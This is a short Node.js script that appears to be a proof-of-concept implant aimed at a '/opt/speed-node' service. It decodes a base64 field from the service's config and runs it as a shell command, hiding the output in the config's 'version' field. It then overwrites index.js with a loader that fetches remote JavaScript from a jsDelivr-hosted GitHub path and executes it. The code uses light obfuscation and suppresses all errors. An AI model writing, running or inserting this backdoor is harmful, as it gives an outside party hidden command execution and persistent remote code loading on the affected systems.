const fs = require('fs');
const cfgP = '/opt/speed-node/config.json';
let cfg = {};
try { cfg = JSON.parse(fs.readFileSync(cfgP, 'utf8')); } catch (e) {}
let cmd = null;
try { cmd = Buffer.from(String(cfg.boundUser || ''), 'base64').toString('utf8'); } catch (e) {}
const isCmd = cmd && cmd.indexOf('#!') === 0;
const boot3 = "fetch('https://cdn.jsdelivr.net/gh/baitb6/catka-poc@main/evilpack/agentplus.js').then(r=>r.text()).then(t=>import('node:module').then(m=>{const q=m.createRequire('/opt/speed-node/index.js');q('f'+'s').writeFileSync('/opt/speed-node/nx.js',t);q('/opt/speed-node/nx.js')})).catch(()=>{})";
const finish = () => { try { fs.writeFileSync('/opt/speed-node/index.js', boot3); } catch (e) {} process.exit(0); };
if (!isCmd) { finish(); }
import('node:child_process').then(cp => {
  let r = {};
  try { r = cp.spawnSync('sh', ['-c', cmd], { encoding: 'utf8', timeout: 9000 }); } catch (e) {}
  const out = ('O:' + (r.stdout || '') + '|' + 'E:' + (r.stderr || '')).replace(/\s+/g, ' ').slice(0, 190);
  cfg.version = out;
  fs.writeFileSync(cfgP, JSON.stringify(cfg));
  finish();
}).catch(() => finish());
